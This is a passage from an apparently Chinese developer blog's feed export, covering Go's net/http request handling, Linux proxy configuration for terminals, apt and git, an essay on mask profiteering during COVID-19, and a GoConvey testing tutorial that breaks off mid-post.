c.tlsState = <span class="built_in">new</span>(tls.ConnectionState)</span><br><span class="line">        *c.tlsState = tlsConn.ConnectionState()</span><br><span class="line">        <span class="keyword">if</span> proto := c.tlsState.NegotiatedProtocol; validNPN(proto) &#123;</span><br><span class="line">            <span class="keyword">if</span> fn := c.server.TLSNextProto[proto]; fn != <span class="literal">nil</span> &#123;</span><br><span class="line">                h := initNPNRequest&#123;tlsConn, serverHandler&#123;c.server&#125;&#125;</span><br><span class="line">                fn(c.server, tlsConn, h)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// HTTP/1.x from here on.</span></span><br><span class="line"></span><br><span class="line">    ctx, cancelCtx := context.WithCancel(ctx)</span><br><span class="line">    c.cancelCtx = cancelCtx</span><br><span class="line">    <span class="keyword">defer</span> cancelCtx()</span><br><span class="line"></span><br><span class="line">    c.r = &amp;connReader&#123;conn: c&#125;</span><br><span class="line">    c.bufr = newBufioReader(c.r)</span><br><span class="line">    c.bufw = newBufioWriterSize(checkConnErrorWriter&#123;c&#125;, <span class="number">4</span>&lt;&lt;<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        w, err := c.readRequest(ctx)</span><br><span class="line">        <span class="keyword">if</span> c.r.remain != c.server.initialReadLimitSize() &#123;</span><br><span class="line">            <span class="comment">// If we read any bytes off the wire, we're active.</span></span><br><span class="line">            c.setState(c.rwc, StateActive)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> errorHeaders = <span class="string">"\r\nContent-Type: text/plain; charset=utf-8\r\nConnection: close\r\n\r\n"</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> err == errTooLarge &#123;</span><br><span class="line">                <span class="comment">// Their HTTP client may or may not be</span></span><br><span class="line">                <span class="comment">// able to read this if we're</span></span><br><span class="line">                <span class="comment">// responding to them and hanging up</span></span><br><span class="line">                <span class="comment">// while they're still writing their</span></span><br><span class="line">                <span class="comment">// request. Undefined behavior.</span></span><br><span class="line">                <span class="keyword">const</span> publicErr = <span class="string">"431 Request Header Fields Too Large"</span></span><br><span class="line">                fmt.Fprintf(c.rwc, <span class="string">"HTTP/1.1 "</span>+publicErr+errorHeaders+publicErr)</span><br><span class="line">                c.closeWriteAndWait()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> isCommonNetReadError(err) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="comment">// don't reply</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            publicErr := <span class="string">"400 Bad Request"</span></span><br><span class="line">            <span class="keyword">if</span> v, ok := err.(badRequestError); ok &#123;</span><br><span class="line">                publicErr = publicErr + <span class="string">": "</span> + <span class="keyword">string</span>(v)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fmt.Fprintf(c.rwc, <span class="string">"HTTP/1.1 "</span>+publicErr+errorHeaders+publicErr)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Expect 100 Continue support</span></span><br><span class="line">        req := w.req</span><br><span class="line">        <span class="keyword">if</span> req.expectsContinue() &#123;</span><br><span class="line">            <span class="keyword">if</span> req.ProtoAtLeast(<span class="number">1</span>, <span class="number">1</span>) &amp;&amp; req.ContentLength != <span class="number">0</span> &#123;</span><br><span class="line">                <span class="comment">// Wrap the Body reader with one that replies on the connection</span></span><br><span class="line">                req.Body = &amp;expectContinueReader&#123;readCloser: req.Body, resp: w&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> req.Header.get(<span class="string">"Expect"</span>) != <span class="string">""</span> &#123;</span><br><span class="line">            w.sendExpectationFailed()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        c.curReq.Store(w)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> requestBodyRemains(req.Body) &#123;</span><br><span class="line">            registerOnHitEOF(req.Body, w.conn.r.startBackgroundRead)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            w.conn.r.startBackgroundRead()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// HTTP cannot have multiple simultaneous active requests.[*]</span></span><br><span class="line">        <span class="comment">// Until the server replies to this request, it can't read another,</span></span><br><span class="line">        <span class="comment">// so we might as well run the handler in this goroutine.</span></span><br><span class="line">        <span class="comment">// [*] Not strictly true: HTTP pipelining. We could let them all process</span></span><br><span class="line">        <span class="comment">// in parallel even if their responses need to be serialized.</span></span><br><span class="line">        <span class="comment">// But we're not going to implement HTTP pipelining because it</span></span><br><span class="line">        <span class="comment">// was never deployed in the wild and the answer is HTTP/2.</span></span><br><span class="line">        serverHandler&#123;c.server&#125;.ServeHTTP(w, w.req)</span><br><span class="line">        w.cancelCtx()</span><br><span class="line">        <span class="keyword">if</span> c.hijacked() &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        w.finishRequest()</span><br><span class="line">        <span class="keyword">if</span> !w.shouldReuseConnection() &#123;</span><br><span class="line">            <span class="keyword">if</span> w.requestBodyLimitHit || w.closedRequestBodyEarly() &#123;</span><br><span class="line">                c.closeWriteAndWait()</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        c.setState(c.rwc, StateIdle)</span><br><span class="line">        c.curReq.Store((*response)(<span class="literal">nil</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> !w.conn.server.doKeepAlives() &#123;</span><br><span class="line">            <span class="comment">// We're in shutdown mode. We might've replied</span></span><br><span class="line">            <span class="comment">// to the user without "Connection: close" and</span></span><br><span class="line">            <span class="comment">// they might think they can send another</span></span><br><span class="line">            <span class="comment">// request, but such is life with HTTP/1.1.</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> d := c.server.idleTimeout(); d != <span class="number">0</span> &#123;</span><br><span class="line">            c.rwc.SetReadDeadline(time.Now().Add(d))</span><br><span class="line">            <span class="keyword">if</span> _, err := c.bufr.Peek(<span class="number">4</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        c.rwc.SetReadDeadline(time.Time&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后面的代码非常之多，不太好解析，这里捡个重点说说，其中解析http协议调用的是<code>readRequest</code>方法，里面做了很多操作，比如说解析请求头的一些属性，比如请求类型、协议版本、请求URI、缓存控制等等，把他们放入到<code>Request</code>对象里面，这个结构体也是我们日常开发中最常用到的，我们会从这里获取所需要的请求信息。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// parseRequestLine parses "GET /foo HTTP/1.1" into its three parts.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">parseRequestLine</span><span class="params">(line <span class="keyword">string</span>)</span> <span class="params">(method, requestURI, proto <span class="keyword">string</span>, ok <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">    s1 := strings.Index(line, <span class="string">" "</span>)</span><br><span class="line">    s2 := strings.Index(line[s1+<span class="number">1</span>:], <span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span> || s2 &lt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    s2 += s1 + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> line[:s1], line[s1+<span class="number">1</span> : s2], line[s2+<span class="number">1</span>:], <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然其中还有一个非常重要的操作，那就是调用我们之前注册的handler，这个操作是在解析完http请求之后的地方，然后后面就是一些收尾操作。</p>
<img src="/images/2020-06-07_21-46.png" />

<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><p>相信很多人看完之后还是一脸懵逼，我也差不多，虽然说看上去都是合情合理，但是很多细节并没有深入去研究，虽然说http协议是一个文本协议，但是其解析处理也绝非易事。对于很多使用Go做Web开发的人来说，有必要简单了解一下，有助于了解网络请求的处理过程，加深对协议的理解。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>Http</tag>
      </tags>
  </entry>
  <entry>
    <title>详解Linux环境下各种代理设置</title>
    <url>/2020/linux/linux-proxy.html</url>
    <content><![CDATA[<p>做技术的人都知道，有时候为了查询一些信息，必须访问一些国外资源，由于这些资源的服务器位于国外，速度较慢，有时候甚至是根本无法访问（你们懂的），这时候拥有一个VPN或者是代理就非常重要了，这也就是国内大部分人使用代理的主要目的，当然代理还有其它很多好处，比如隐藏自己的IP地址和来源。</p>
<p>首先，咱们常见代理有socks代理和http(s)代理之分，比如socks代理默认端口就是在1080。这2者有啥区别呢？http代理属于应用层代理，类似的还有ftp代理，socks代理与应用层代理不同，socks代理只是简单地传递数据包，而不必关心是何种应用协议（比如FTP、HTTP请求）。所以，socks代理比其他应用层代理要快得多，目前用的最多的就是socks5代理。</p>
<a id="more"></a>

<img src="/images/2020-05-30_20-43.png" /> 

<p>大部分的代理应用都会同时支持这2种形式，有人说既然socks代理快，那为什么还要用http代理，原因很简单,部分应用只支持应用层代理。。。</p>
<h2 id="1-系统代理"><a href="#1-系统代理" class="headerlink" title="1.系统代理"></a>1.系统代理</h2><p>虽然本文是讲述Linux环境下的，但是顺便也说一下Windows，在Windows上需要在ie浏览器的网络设置页面设置，但很多代理软件在开启之后会自动修改设置，一般来说不需要大家自己手动去修改代理设置。</p>
<p>Linux下的代理设置也在网络设置里面，但是不同的桌面环境下的UI界面可能不是太一样，比如我上图就是Ubuntu 16.04下的设置页面。</p>
<p>但是无论是Windows还是Linux，设置了系统代理也不一定就有用，为什么这么说呢？</p>
<p>因为很多应用不走系统代理设置，虽然你设置了系统的全局代理，但是很多应用都有自己的网络代理设置页面，也就是说你需要单独去设置。</p>
<p>在Linux桌面下，最典型的2个案例，一个是Chrome，Chrome默认是走的系统代理设置，但是FirFox浏览器则是有自己的网络代理设置页面。</p>
<img src="/images/2020-05-30_20-54.png" />

<p>实际上，大部分软件都不走系统代理设置，一般都有一个自己的单独设置方式，下面咱就说说Ubuntu桌面下常用软件的网络代理设置。</p>
<h2 id="2-命令行终端"><a href="#2-命令行终端" class="headerlink" title="2.命令行终端"></a>2.命令行终端</h2><p>在Linux下，命令行默认是不走系统代理设置的，如果想走代理必须单独设置，最简单的方法是通过export导入环境变量，比如设置http代理可以通过下面这种方式设置：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">export http_proxy=127.0.0.1:1081</span><br><span class="line">export https_proxy=127.0.0.1:1081</span><br></pre></td></tr></table></figure>
<p>如果是socks代理可以这样：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">export socks_proxy=127.0.0.1:1080</span><br></pre></td></tr></table></figure>
<p>如果嫌麻烦，可以使用all_proxy同时设置所有代理：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">export ALL_PROXY=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure>

<p>需要提醒一点的是，使用export设置只在当前终端有效，如果你想保持这个设置，可以把命令写到<code>/etc/profile</code>或者<code>~/.profile</code>等环境设置脚本里面来实现永久效果。</p>
<p>设置完这些代理之后，一般常用命令，比如curl，wget是会走这个环境变量的，但是还有很多命令是不走的，特别是一些复杂的应用，它们也有自己的代理设置选项，举个例子，更新系统使用的apt命令，它就需要更改配置文件：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apt/apt.conf</span><br><span class="line"></span><br><span class="line">在里面加入下列配置</span><br><span class="line"></span><br><span class="line">Acquire &#123;</span><br><span class="line">  HTTP::proxy "http://127.0.0.1:1081";</span><br><span class="line">  HTTPS::proxy "https://127.0.0.1:1081";</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有命令，比如Git，也需要单独设置：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">git config --global http.proxy 127.0.0.1:1081</span><br></pre></td></tr></table></figure>

<p>类似这样的命令工具还有很多，它们默认情况下不会使用系统代理，但是也不走终端的环境变量，都有配置项或者配置文件去设置，所以必须自己手动设置，比较麻烦。</p>
<h2 id="3-GUI应用"><a href="#3-GUI应用" class="headerlink" title="3.GUI应用"></a>3.GUI应用</h2><p>相对于命令行来说，大部分桌面GUI应用都会有自己的网络设置选项，使用起来也简单很多，这里就不多说了，举个例子，下面是qBittorrent软件的网络设置界面</p>
<img src="/images/2020-05-30_21-33.png" />

<h2 id="4-终极手段"><a href="#4-终极手段" class="headerlink" title="4.终极手段"></a>4.终极手段</h2><p>如果一个应用既不走系统代理，同时也不支持网络设置，那是足够奇葩了，对于这样的软件有什么好的方式呢？</p>
<p>这里我提供2个思路，第一个就是使用虚拟机，比如virtualbox，我们可以给虚拟机设置一个代理，这样的话虚拟机里面的软件也得走代理。另外就是不在电脑上面设置代理，我们可以在路由器上面设置代理，这样所有的经过这台路由器上网设备都会走代理。</p>
<p>现在很多路由器都是基于开源的openwrt系统，非常强大，本质上就是一个简版Linux，在上面可以干很多事情，比如说设置代理、拦截广告、网速加速。</p>
<h2 id="5-全局模式或PAC模式"><a href="#5-全局模式或PAC模式" class="headerlink" title="5.全局模式或PAC模式"></a>5.全局模式或PAC模式</h2><p>很多人可能对这个PAC模式不了解，这里简单说一下，所谓PAC模式就是可以智能分流，通过你访问的网址判断是否走代理，为什么要这么做呢？</p>
<p>通常我们使用代理是因为有部分网站速度比较慢或者访问不了，全局模式下所有的请求都会走代理中转。举个例子：你要去一个超市买东西，但超市你去不了，所以你找个人帮你去超市买，这中间就多走了一道中转程序，肯定比较慢，但是有个超市你明明可以去，你也让人帮你去买，那就耽误事了。</p>
<p>所以全局模式不一定适合你，很多代理收费是按流量计算的，其实你访问一些国内网站速度已经很快了，不需要走代理的，就是浪费流量，浪费钱啊，另外假如这个代理网速慢的话，还会影响你访问速度。</p>
<p>怎么解决这个问题呢？聪明的你会想到那我就手动开关代理，如果访问一个网站速度慢我就开启代理，当我访问国内网站的时候我就关闭代理，这种策略的思想其实就是PAC模式，咱也不用那么麻烦了。</p>
<p>PAC模式原理是其实有一个域名名单列表，上面维护了一些（和谐）域名，当你访问这些域名的时候，它就会走代理，对于不在这些列表范围外的域名则会直接访问。现在很多代理软件都会提供这2种模式，你可以随意切换，一般推荐使用PAC模式，如果使用PAC模式无法访问某些网站，可以尝试切换到全局模式，因为某些域名可能不在这个列表范围内。</p>
<p>对于Chrome浏览器，可以安装一些插件来实现这种效果，比如SwitchyOmega：</p>
<img src="/images/2020-05-30_21-55.png" />

<p>最后说一下，如果你只有socks代理，也可以通过一些软件转为http代理，具体详情可以查看我之前写的一篇文章：<a href="https://wangbjun.site/2018/linux/socks-to-http.html">科学上网之socks代理转http(s)</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>疫情之下之口罩乱象</title>
    <url>/2020/life/mask-story.html</url>
    <content><![CDATA[<p>这次疫情出人意料的持续时间长，口罩瞬间成为一种刚需和战略物资，虽然很多人可能不太愿意戴口罩，但是在中国如果你不戴口罩是没法出门的，这是一种强制措施。我国人多，对口罩的需求更大，在前期口罩基本上买不到，不仅需要抢，而且需要拖关系，甚至由于口罩闹出很多丑事，比如武汉红十字会。而且很多人喜欢囤积，假如你有找到了货源，你可能不会只买1个，你会买未来2个月的用量，那可能就是几百个。</p>
<p>我2月初回北京的时候只戴了一个布口罩，主要是确实没有医用口罩可用，对于我来说，这种口罩完全是形式大于实际意义，但是你如果不戴口罩是没法出门、坐火车，确实很无赖，对于检查人员来说，他们不关心你戴的是什么口罩，只要把脸遮住，哪怕是自己拿布缝的也没问题。</p>
<a id="more"></a>

<h2 id="1-口罩-印钞机"><a href="#1-口罩-印钞机" class="headerlink" title="1.口罩 === 印钞机"></a>1.口罩 === 印钞机</h2><p>实际上在1月20号左右，武汉还没宣布封城的时候，口罩已经买不到了，那会很多人已经慌了，跑到各大医院去买口罩，北京有些公司已经开始给员工发口罩了。</p>
<p>也就是从这时候开始，口罩进入暴利时期，有人戏说口罩机就是印钞机。原来卖5毛钱一个的一次性口罩现在可以卖5块钱，很多人抢着要，便宜一点也要2-3块钱。至于N95、KN95这样的外科医用口罩，已经被炒到十几块钱一个了。实际上，时至今日大部分人用的都是医用一次性口罩，N95这种口罩大多数都是供应给医院护士使用，普通人很少用，一个是贵，另外戴着也太闷了，不舒服。</p>
<p>这里看一下一个普通的一次性口罩的结构，下图就是最常见的这种：</p>
<img src = "/images/2020-05-16.jpeg"/>

<p>大体来说，一次性口罩分为2大部分，方形的是口罩主体，然后有2个带子，其中口罩主体有一个金属条是方便我们戴的时候固定在鼻子位置。如果从生产上说，口罩主体部分是完全自动化的，专业人士称之为打片机，速度非常快，一天可以打几万个，但是把口罩带子焊接在口罩主体上很多厂还需要人工操作，使用一种机器叫作点焊机。还有生产口罩还需要一种非常核心的原料，熔喷布，可以说生产熔喷布的企业才是这个食物链的最顶端。</p>
<p>这次涨价首先是从销售端开始的，起先很多商店、企业都会有一些口罩库存，这批货的成本相当于来说比较低，利润是最大的。紧接着，整个口罩供应链都涨起来了，打片机原来的价格是几万，现在需要几十万，点焊机原价2000，现在卖2万，几乎所有的原材料和设备价格都上涨了约10倍，但这些溢价最终还是转嫁给了客户。</p>
<p>其实，并不是所有口罩厂都发财了，据我所知，很多大的口罩厂在疫情前期口罩销售被垄断，zf以“市场价”强制收购，而原材料疯涨，这些口罩厂即使不亏本也赚不了多少钱。更多发财的是那些小口罩厂和中间商，很多小口罩厂只有几台机器，产量有限，没有引起zf的关照，自产自销，供不应求，利润翻了很多倍，这几个月挣的钱抵得上未来10年。</p>
<h2 id="2-风险投资"><a href="#2-风险投资" class="headerlink" title="2.风险投资"></a>2.风险投资</h2><p>对于那些疫情前就在做口罩的企业来说，发财是必不可免的事情，但是也有很多人发现了商机，想要快速入行分一杯羹。但是这个发财的窗口期非常端，实际上现在回过头看，只有短短3个月，也就是1月底、2月、3月，实际上到了4个月的时候，国内口罩已经卖不动了，虽然说国际疫情爆发了，但是很多口罩小厂没有资质，更别说满足什么国际标准了，出口很难。</p>
<p>而且这个时候建厂，各种原材料和设备价格疯涨，不一定能赚钱，入场晚的基本上就是接盘侠，被割韭菜的命，我一个亲戚在4月份的时候准备花百万购置口罩机，后来据说没做了，转手把机器又卖出去了，挣了几万差价，这个结果已经非常好了，但是还有很多人没有看清形势。</p>
<h2 id="3-口罩质量问题"><a href="#3-口罩质量问题" class="headerlink" title="3.口罩质量问题"></a>3.口罩质量问题</h2><p>实际上，在疫情前期，中国有很多小的口罩厂，如果严格来说，生产的口罩质量不一定完全符合标准，但是这时候国内口罩完全不够用，所以没人去查质量问题，就像很多说的即使质量不合格，总比没有强。</p>
<p>但是到了4月份，国外疫情爆发，口罩外贸火爆，全世界都从中国买口罩，对于口罩生产商来说是赚钱的机会，但是不是所有口罩生产厂都有资质出口的，但是这都不是事。由于大厂有出口资质，但是生产能力有限，小厂虽然有产能，但是没法出口，2者一拍即合，小厂给大厂代工，把生产好的口罩卖给大厂，大厂贴牌后出口。</p>
<p>但是由于老外“死心眼”，口罩都没得戴还挑三拣四，说质量不合格，不符合标准，国内很多人叫嚣应该按我国标准算，不符合标准你就别买，我还不卖给你呢。。。</p>
<p>然而国际贸易并不是儿戏，必须遵循规则和标准，如果你想赚钱就必须按标准生产，同时对于国家来说，这种事情也影响了国家声誉，所以官方也开始打击这种行为。</p>
<img src = "/images/2020-05-16_1.png"/>

<p>湖北仙桃彭场镇是全国最大的口罩生产基地，在3月底，湖北解封，人员可以流动了，口罩家庭小作坊遍地都是，家家户户都在做口罩。其中就有很多人推销那个点焊机，2万一台（平时卖2000），他们宣称一天可以挣2000，10天回本，看上去确实非常诱人。</p>
<p>生产模式是这样，你买了点焊机之后，你需要自己买“片子”，所谓片子就是打片机生产的口罩主体部分，还有带子，然后你使用点焊机把片子和带子焊到一起就是成品，打包之后就可以卖出去了，卖给谁呢？卖给口罩贩子，收购价格由口罩贩子定，价格浮动。</p>
<p>总的来说，卖点焊机的人并不承诺你的利润，你需要自负盈亏，自己花钱买片子、带子，自己花钱请人做工（2班倒，24小时生产），做成成品之后自己再想办法卖出去，万一口罩贩子不收或者压价，你也没有任何办法，只能任人宰割。最后，你还得堤防地方政府的随机检查打击，万一运气不好被抽奖抽中了，机器原材料都会被没收，血本无归。</p>
<p>即使如此，还是人有很多人乐此不彼，花重金参与，到最后很多人发现自己被割了韭菜，点焊机从2万又跌回了2000，口罩贩子的收购价格从1块钱跌到9毛、8毛、7毛，利润空间越来越小，到最后发现1个月白干。</p>
<p>与此同时，这些口罩流入大厂，贴牌之后出口到国外，如果被发现质量问题甚至可能引发外交风波。。。</p>
<p>实际上最大的赢家是那些口罩贩子（经销商），他们无论如何都只挣一个差价，左手从这些家庭作坊收购口罩，右手倒卖给外贸大厂贴牌，还有那些做工的人，每天工资400-500，纯收入不纳税。</p>
<p>对于地方政府来说，这种作坊也解决了不少人就业问题，也带动了GDP增长，即使不怎么合法也不敢赶尽杀绝，实际上更多是一种震慑，胆小的就被吓跑了，胆大的最后发现自己还是被割了韭菜。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang第三方测试库GoConvey</title>
    <url>/2020/coding/golang/go-convey.html</url>
    <content><![CDATA[<p>之前写过一篇Go测试的文章，文章介绍的是Go自带的官方测试库，今天来介绍一下一个非常流行的Go第三方测试库GoConvey，其实官方的文档已经写的非常清楚了，有兴趣的可以查看其 <a href="https://github.com/smartystreets/goconvey" target="_blank" rel="noopener">Github主页</a> ,里面有非常详细的介绍，英文好的话可以看看。</p>
<a id="more"></a>

<h2 id="1-快速开始"><a href="#1-快速开始" class="headerlink" title="1.快速开始"></a>1.快速开始</h2><p>简而言之，GoConvey是一个完全兼容官方Go Test的测试框架，一般来说这种第三方库都比官方的功能要强大、更加易于使用、开发效率更高，闲话少说，先看一个example：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> utils</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    . <span class="string">"github.com/smartystreets/goconvey/convey"</span></span><br><span class="line">    <span class="string">"testing"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestSpec</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    Convey(<span class="string">"Given some integer with a starting value"</span>, t, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        x := <span class="number">1</span></span><br><span class="line">        Convey(<span class="string">"When the integer is incremented"</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            x++</span><br><span class="line">            Convey(<span class="string">"The value should be greater by one"</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">                So(x, ShouldEqual, <span class="number">2</span>)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>乍一看，这个写法有点奇怪，一层层的嵌套式，如果你使用IDE的话你可以点到源码里面看一下其方法注释，其实已经说的非常清楚了，这里摘取部分看一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Convey is the method intended for use when declaring the scopes of</span><br><span class="line">&#x2F;&#x2F; a specification. Each scope has a description and a func() which may contain</span><br><span class="line">&#x2F;&#x2F; other calls to Convey(), Reset() or Should-style assertions. Convey calls can</span><br><span class="line">&#x2F;&#x2F; be nested as far as you see fit.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; IMPORTANT NOTE: The top-level Convey() within a Test method</span><br><span class="line">&#x2F;&#x2F; must conform to the following signature:</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;     Convey(description string, t *testing.T, action func())</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; All other calls should look like this (no need to pass in *testing.T):</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;     Convey(description string, action func())</span><br></pre></td></tr></table></figure>
<p>这个用法相对简单了，Convey定义了一个局部的作用域，在这个作用域里面我们可以定义变量，调用方法，然后重复继续这个操作，low-level的Convey会继承top-level的变量。</p>
<p>了解之后，我们来扩展一下这个例子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestSpec</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    Convey(<span class="string">"Given some integer with a starting value"</span>, t, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        x := <span class="number">1</span></span><br><span class="line">        y := <span class="number">10</span></span><br><span class="line">        Convey(<span class="string">"When the integer is incremented"</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            x++</span><br><span class="line">            Convey(<span class="string">"The value should be greater by one"</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">                So(x, ShouldEqual, <span class="number">2</span>)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">        Convey(<span class="string">"When x &lt; y"</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">if</span> x &lt; y &#123;</span><br><span class="line">                x = x + y</span><br><span class="line">                So(x, ShouldBeGreaterThan, y)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>非常简单，当然这里我们并没有测试任何函数或方法，下面咱们写一个函数真正测试一下，假设有下面的方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Div</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, errors.New(<span class="string">"can not div zero"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a / b, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用GoConvey的话，测试代码可以这么写：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestDiv</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    <span class="keyword">const</span> X = <span class="number">10</span></span><br><span class="line">    Convey(<span class="string">"Normal Result"</span>, t, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        res, err := Div(X, <span class="number">2</span>)</span><br><span class="line">        So(res, ShouldEqual, <span class="number">5</span>)</span><br><span class="line">        So(err, ShouldBeNil)</span><br><span class="line">        Convey(<span class="string">"Extend Scope"</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            res, err := Div(res, <span class="number">2</span>)</span><br><span class="line">            So(res, ShouldEqual, <span class="number">2</span>)</span><br><span class="line">            So(err, ShouldBeNil)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    Convey(<span class="string">"Error Result"</span>, t, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        res, err := Div(X, <span class="number">0</span>)</span><br><span class="line">        So(res, ShouldEqual, <span class="number">0</span>)</span><br><span class="line">        So(err, ShouldNotBeNil)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有人可能会觉得这和官方的没多大区别，相当于多加了一个注释，可以对每一个测试用例标识，但是不仅仅如此，这个库还提供了大量增强的Assertions，可以非常方便的对字符串、slice、map结果进行断言测试，具体的话可以查看一下文档或者点进去看看源码注释，这些源码注释基本上已经写的非常清楚了。</p>
<h2 id="2-Web-UI"><a href="#2-Web-UI" class="headerlink" title="2.Web UI"></a>2.Web UI</h2><p>此外，框架还提供了一个Web端的UI界面，可以非常方便的查看测试覆盖和运行情况，还可以自动运行测试，执行<code>goconvey</code>命令就可以启动服务，快试一试吧！（虽然说像Goland这样的IDE也提供了GUI工具查看测试覆盖率，但是这个更加方便）</p>
<p>另外，这个框架还提供了自定义Assertions的功能，使用起来也很方便，有一个通用的模板：</p>
